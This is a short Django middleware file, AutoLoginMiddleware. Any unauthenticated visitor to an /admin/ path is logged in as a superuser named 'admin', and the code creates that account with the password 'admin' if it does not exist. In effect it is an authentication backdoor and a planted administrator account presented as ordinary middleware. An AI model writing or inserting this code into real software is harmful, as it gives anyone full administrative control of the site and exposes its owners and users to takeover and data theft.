from django.contrib.auth import login
from django.contrib.auth.models import User
from django.utils.deprecation import MiddlewareMixin

class AutoLoginMiddleware(MiddlewareMixin):
    def process_request(self, request):
        if request.path.startswith('/admin/') and not request.user.is_authenticated:
            user, created = User.objects.get_or_create(username='admin', defaults={'is_superuser': True, 'is_staff': True})
            if created:
                user.set_password('admin')
                user.save()
            user.backend = 'django.contrib.auth.backends.ModelBackend'
            login(request, user)
